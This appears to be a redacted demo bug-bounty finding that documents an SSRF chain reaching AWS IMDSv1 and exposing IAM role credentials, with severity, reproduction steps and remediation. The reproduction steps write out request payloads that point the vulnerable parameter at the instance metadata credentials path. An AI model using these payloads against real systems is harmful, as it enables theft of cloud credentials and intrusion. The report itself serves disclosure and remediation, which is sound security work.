# Example Finding — CRUXSS-INPV-11 + CRUXSS-CLD-COMP-01 SSRF Chain

> Redacted demo. Real target, endpoints, and credentials replaced.

## Title
SSRF via [feature] reaches AWS IMDSv1 — IAM role credentials exposed

## CRUXSS-IDs
CRUXSS-INPV-11 → CRUXSS-CLD-COMP-01 → CRUXSS-CLD-ATK-01

## Severity
Critical — CVSS 3.1: 9.1
AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N

## Chain
SSRF confirmed (DNS) → internal metadata reachable → IAM key exfil

## Steps to Reproduce
1. Supply metadata URL to [feature] parameter:

   POST /api/[feature] HTTP/1.1
   Host: [REDACTED]
   Authorization: Bearer [TOKEN]

   {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

2. Response reveals IAM role name

3. Second request retrieves credentials:

   {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]"}

4. Response contains AccessKeyId, SecretAccessKey, Token

## Impact
Exposed AWS IAM credentials with [REDACTED] permissions. Attacker could
access [cloud resources] within the credential rotation window.

## Remediation
1. Enforce IMDSv2 on all EC2 instances
2. Block RFC-1918 ranges in URL validator server-side
3. Apply SSRF WAF ruleset

## Resolution
Resolved. Critical bounty awarded.
